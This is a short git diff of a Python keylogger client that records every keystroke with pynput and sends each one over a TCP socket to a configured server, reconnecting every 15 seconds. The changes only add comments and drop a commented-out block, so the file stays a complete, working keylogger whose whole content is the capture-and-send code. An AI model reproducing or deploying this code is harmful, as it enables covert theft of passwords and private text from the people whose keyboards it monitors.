@@ -2,6 +2,7 @@ from pynput.keyboard import Key, Listener
 import socket
 import time
 
+# Attempt to connect to server every 15 seconds
 def initConn():
     global client
     client = socket.socket()
@@ -15,7 +16,7 @@ def initConn():
             pass
     print("Connection has been established!")
 
-
+# Send keystrokes to server
 def on_press(key):
     try:
         client.send((str(key)).encode())
@@ -23,21 +24,11 @@ def on_press(key):
         print(err)
         client.close()
         initConn()
-        """
-    if str(key) != "Key.ctrl_r":
-        client.send((str(key)).encode())
-    else:
-        client.send((str(key)).encode())
-        print("Connection Closed.")
-        client.close()
-        initConn()
-        """
 
+# Connect to server and capture keystrokes
 if __name__ == '__main__':
     SERVER_HOST = '127.0.0.1'
     SERVER_PORT = 47620
     initConn()
     with Listener(on_press=on_press) as listener:
         listener.join()
-
-
